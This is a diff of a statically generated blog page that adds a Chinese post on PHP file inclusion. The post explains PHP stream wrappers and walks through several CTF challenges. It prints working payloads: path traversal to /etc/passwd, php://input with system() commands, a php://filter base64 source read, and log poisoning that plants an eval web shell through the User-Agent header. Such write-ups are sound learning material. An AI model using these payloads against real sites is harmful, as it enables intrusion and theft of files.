@@ -6,14 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Archives: 2022/4 | Hexo</title>
+  <title>include | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/archives/2022/04/index.html">
+  <meta name="description" content="常见伪协议的作用   协议 作用    php:&#x2F;&#x2F;input 可以访问请求的原始数据的只读流，在POST请求中访问POST的data部分，在enctype&#x3D;“multipart&#x2F;form-data” 的时候php:&#x2F;&#x2F;input 是无效的。   php:&#x2F;&#x2F;output 只写的数据流，允许以 print 和 echo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="include">
+<meta property="og:url" content="http://example.com/2022/09/12/include/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="常见伪协议的作用   协议 作用    php:&#x2F;&#x2F;input 可以访问请求的原始数据的只读流，在POST请求中访问POST的data部分，在enctype&#x3D;“multipart&#x2F;form-data” 的时候php:&#x2F;&#x2F;input 是无效的。   php:&#x2F;&#x2F;output 只写的数据流，允许以 print 和 echo">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-09-12T14:36:18.000Z">
+<meta property="article:modified_time" content="2022-09-12T14:37:34.635Z">
 <meta property="article:author" content="John Doe">
+<meta property="article:tag" content="include">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
@@ -146,98 +151,268 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-include" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2022" class="archive-year">2022</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/04/27/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" class="archive-article-date">
-  	<time datetime="2022-04-27T08:00:53.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-04-27</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/04/27/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/">信息泄露</a>
+    <h1 class="article-title" itemprop="name">
+      include
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2022/09/12/include/" class="archive-article-date">
+  	<time datetime="2022-09-12T14:36:18.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-09-12</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="常见伪协议的作用"><a href="#常见伪协议的作用" class="headerlink" title="常见伪协议的作用"></a>常见伪协议的作用</h2><table>
+<thead>
+<tr>
+<th>协议</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>php:&#x2F;&#x2F;input</td>
+<td>可以访问请求的原始数据的只读流，在POST请求中访问POST的data部分，在enctype&#x3D;“multipart&#x2F;form-data” 的时候php:&#x2F;&#x2F;input 是无效的。</td>
+</tr>
+<tr>
+<td>php:&#x2F;&#x2F;output</td>
+<td>只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</td>
+</tr>
+<tr>
+<td>php:&#x2F;&#x2F;fd</td>
+<td>(&gt;&#x3D;5.3.6)允许直接访问指定的文件描述符。例如 php:&#x2F;&#x2F;fd&#x2F;3 引用了文件描述符 3。</td>
+</tr>
+<tr>
+<td>php:&#x2F;&#x2F;memory php:&#x2F;&#x2F;temp</td>
+<td>(&gt;&#x3D;5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 php:&#x2F;&#x2F;memory 总是把数据储存在内存中，而 php:&#x2F;&#x2F;temp 会在内存量达到预定义的限制后（默认是  2MB）存入临时文件中。临时文件位置的决定和 sys_get_temp_dir() 的方式一致。</td>
+</tr>
+<tr>
+<td>php:&#x2F;&#x2F;filter</td>
+<td>(&gt;&#x3D;5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。</td>
+</tr>
+</tbody></table>
+<h2 id="php-x2F-x2F-filter参数详解"><a href="#php-x2F-x2F-filter参数详解" class="headerlink" title="php:&#x2F;&#x2F;filter参数详解"></a><strong>php:&#x2F;&#x2F;filter参数详解</strong></h2><p> 该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：</p>
+<table>
+<thead>
+<tr>
+<th>php:&#x2F;&#x2F;filter 参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>resource&#x3D;&lt;要过滤的数据流&gt;</td>
+<td>必须项。它指定了你要筛选过滤的数据流。</td>
+</tr>
+<tr>
+<td>read&#x3D;&lt;读链的过滤器&gt;</td>
+<td>可选项。可以设定一个或多个过滤器名称，以管道符分隔</td>
+</tr>
+<tr>
+<td>write&#x3D;&lt;写链的过滤器&gt;</td>
+<td>可选项。可以设定一个或多个过滤器名称，以管道符</td>
+</tr>
+<tr>
+<td>&lt;; 两个链的过滤器&gt;</td>
+<td>任何没有以 read&#x3D; 或 write&#x3D; 作前缀的筛选器列表会视情况应用于读或写链。</td>
+</tr>
+</tbody></table>
+<h2 id="ctfshow-web3"><a href="#ctfshow-web3" class="headerlink" title="ctfshow web3"></a>ctfshow web3</h2><ol>
+<li><p>测试：<a target="_blank" rel="noopener" href="https://d7c9f3d7-64d2-4110-a14b-74c61f65893c.chall.ctf.show/?url=../../../../../../../../../../etc/passwd">https://d7c9f3d7-64d2-4110-a14b-74c61f65893c.chall.ctf.show/?url=../../../../../../../../../../etc/passwd</a></p>
+</li>
+<li><p>抓包：<a target="_blank" rel="noopener" href="https://d7c9f3d7-64d2-4110-a14b-74c61f65893c.chall.ctf.show**/?url=php://input">https://d7c9f3d7-64d2-4110-a14b-74c61f65893c.chall.ctf.show**/?url=php://input</a>**</p>
+</li>
+<li><p>查询文件结构：<?php system("ls");?></p>
+</li>
+<li><p>查看文件内容：<?php system("cat ctf go_go_go");?></p>
+</li>
+<li><p>得到flag</p>
+</li>
+</ol>
+<h2 id="buuctf-ACTF2020-新生赛-Include"><a href="#buuctf-ACTF2020-新生赛-Include" class="headerlink" title="buuctf  ACTF2020 新生赛]Include"></a>buuctf  ACTF2020 新生赛]Include</h2><ol>
+<li><p>url中有?file&#x3D;flag.php，文件包含，可用伪协议：php:&#x2F;&#x2F;</p>
+</li>
+<li><p>php:&#x2F;&#x2F;访问各个输入&#x2F;输出流（I&#x2F;O streams），CTF中经常使用的是</p>
+<ol>
+<li>php:&#x2F;&#x2F;filter             用于读取源码</li>
+<li>php:&#x2F;&#x2F;input            用于执行php代码</li>
+</ol>
+</li>
+<li><p>先读取源码   &#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php   无反应</p>
+</li>
+<li><p>&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
+</li>
+<li><p>得到一串编码，base64解码得flag PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7YjA5YTQzM2EtMjcwOS00NThkLTgwOGEtNDM1NmQxZmI4NTAyfQo&#x3D;</p>
+</li>
+</ol>
+<?php
+
+echo "Can you find out the flag?";
+//flag{b09a433a-2709-458d-808a-4356d1fb8502}
+
+## web4
+
+1. 日志目录：?url=/var/log/nginx/access.log
+
+2. 抓包 **user agent**添加 
+
+   <?php @eval($_POST['a']);?>
+
+<ol start="3">
+<li><p>蚁剑  <a target="_blank" rel="noopener" href="http://9e8ef844-af16-4ed6-aff5-5f9ff1459fc3.challenge.ctf.show/?url=/var/log/nginx/access.log">http://9e8ef844-af16-4ed6-aff5-5f9ff1459fc3.challenge.ctf.show/?url=/var/log/nginx/access.log</a></p>
+</li>
+<li><p>密码为a</p>
+</li>
+<li><p>查看目录</p>
+</li>
+</ol>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>因风道感谢，情至笔载援<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">include</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2022/09/12/include/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/04/09/%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87/" class="archive-article-date">
-  	<time datetime="2022-04-09T05:42:46.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-04-09</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2022/09/08/eva/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">eva</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/04/09/%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87/">过滤绕过</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
   
 
-    
+  
+
+  
 
 
           </div>
@@ -260,8 +435,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
